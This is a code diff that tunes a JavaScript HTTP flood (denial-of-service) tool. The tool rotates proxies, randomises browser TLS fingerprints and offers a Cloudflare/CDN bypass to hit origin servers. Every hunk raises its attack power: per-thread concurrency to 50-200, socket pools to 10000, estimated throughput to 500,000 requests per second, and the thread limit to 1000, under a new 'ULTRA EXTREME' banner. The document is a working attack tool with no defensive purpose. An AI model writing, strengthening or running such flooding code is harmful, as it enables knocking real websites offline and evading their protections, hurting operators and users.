@@ -183,7 +183,7 @@ const config = {
         connectionReuse: 0,
         adaptiveMetrics: {
             lastSuccessRate: 100,
-            currentConcurrency: 5
+            currentConcurrency: 20
         }
     }
 };
@@ -309,8 +309,8 @@ function createTLSAgent(profile, proxyUrl = null) {
         sessionTimeout: 300,
         keepAlive: true,
         keepAliveMsecs: 1000,
-        maxSockets: 1024,
-        maxFreeSockets: 512,
+        maxSockets: 10000,
+        maxFreeSockets: 5000,
         timeout: 5000,
         scheduling: 'fifo'
     };
@@ -326,8 +326,8 @@ function createTLSAgent(profile, proxyUrl = null) {
             rejectUnauthorized: false,
             keepAlive: true,
             keepAliveMsecs: 1000,
-            maxSockets: 1024,
-            maxFreeSockets: 512,
+            maxSockets: 10000,
+            maxFreeSockets: 5000,
             timeout: 5000
         };
         
@@ -910,23 +910,23 @@ class HTTPFlood {
         console.log(`${colors.blue}${icons.target} Target: ${colors.bright}${this.url}${colors.reset}`);
         console.log(`${colors.magenta}${icons.clock} Duration: ${colors.bright}${this.duration}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.fire} Threads: ${colors.bright}${this.threads}${colors.reset}`);
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
-        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}EXTREME${colors.reset}${colors.green} (10-50 concurrent/thread, INSANE SPEED)${colors.reset}`);
+        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ULTRA EXTREME${colors.reset}${colors.green} (50-200 concurrent/thread, MAXIMUM POWER)${colors.reset}`);
         console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}NO DELAYS${colors.reset}${colors.yellow} (maximum throughput mode)${colors.reset}`);
         console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
         console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
         console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + 10 redirects + realistic navigation${colors.reset}`);
         console.log(`${colors.green}${icons.info} Protocol: ${colors.bright}HTTP/1.1 + HTTP/2${colors.reset}${colors.green} with TLS fingerprinting${colors.reset}`);
         console.log(`${colors.magenta}${icons.check} Fingerprint: ${colors.bright}5 Browser Profiles${colors.reset}${colors.magenta} (randomized per thread)${colors.reset}`);
-        console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
+        console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '10000' : '5000'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
         
-        const baseRPS = config.proxies.length > 0 ? 800 : 1000; // EXTREME MODE
-        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
+        const baseRPS = config.proxies.length > 0 ? 2000 : 5000; // ULTRA EXTREME MODE
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 200000 : 500000));
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
         console.log(`${colors.bright}${colors.green}${icons.fire} Estimated Throughput: ${colors.yellow}${estimatedRPS.toLocaleString()}${colors.reset}${colors.green} - ${colors.yellow}${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()}${colors.reset}${colors.green} req/s${colors.reset}`);
         
-        if (this.threads > 100) {
-            console.log(`${colors.yellow}${icons.warning} WARNING: ${colors.bright}${this.threads}${colors.reset}${colors.yellow} threads may overwhelm MacBook Air M2${colors.reset}`);
-            console.log(`${colors.blue}${icons.info} Recommended: ${colors.bright}50-80 threads${colors.reset}${colors.blue} for optimal performance${colors.reset}`);
+        if (this.threads > 300) {
+            console.log(`${colors.yellow}${icons.warning} WARNING: ${colors.bright}${this.threads}${colors.reset}${colors.yellow} threads may overwhelm system resources${colors.reset}`);
+            console.log(`${colors.blue}${icons.info} Recommended: ${colors.bright}100-200 threads${colors.reset}${colors.blue} for optimal performance${colors.reset}`);
         }
         
         if (this.useOrigin && this.domain) {
@@ -966,7 +966,7 @@ class HTTPFlood {
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
-        let concurrency = 10; // Adaptive: starts at 10, can go 10-50 EXTREME
+        let concurrency = 50; // Adaptive: starts at 50, can go 50-200 EXTREME
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -1008,8 +1008,8 @@ class HTTPFlood {
                             honorCipherOrder: true,
                             keepAlive: true,
                             keepAliveMsecs: 1000,
-                            maxSockets: 2048,
-                            maxFreeSockets: 1024,
+                            maxSockets: 10000,
+                            maxFreeSockets: 5000,
                             timeout: 10000
                         };
                         
@@ -1021,8 +1021,8 @@ class HTTPFlood {
                             ? new HttpsProxyAgent(proxy, agentTlsOptions)
                             : new HttpProxyAgent(proxy, { 
                                 keepAlive: true,
-                                maxSockets: 2048,
-                                maxFreeSockets: 1024,
+                                maxSockets: 10000,
+                                maxFreeSockets: 5000,
                                 timeout: 10000 
                               });
                         lastProxyIndex = proxyIndex;
@@ -1146,13 +1146,13 @@ class HTTPFlood {
             if (localCount > 0 && localCount % 50 === 0) {
                 const currentSuccessRate = (successCount / localCount) * 100;
                 
-                if (currentSuccessRate > 80 && concurrency < 50) {
-                    concurrency += 2; // Increase faster
+                if (currentSuccessRate > 80 && concurrency < 200) {
+                    concurrency += 5; // Increase faster
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Increased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                     }
-                } else if (currentSuccessRate < 40 && concurrency > 10) {
-                    concurrency--;
+                } else if (currentSuccessRate < 40 && concurrency > 20) {
+                    concurrency -= 2;
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Decreased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                     }
@@ -1270,7 +1270,7 @@ async function main() {
         }
         
         const duration = parseInt(await question('[>] Duration (seconds): '));
-        const threads = parseInt(await question('[>] Number of threads (10-500): '));
+        const threads = parseInt(await question('[>] Number of threads (10-1000): '));
         
         const bypassCF = await question('[?] Attempt Cloudflare/CDN bypass? (y/n): ');
         const useOrigin = bypassCF.toLowerCase() === 'y';
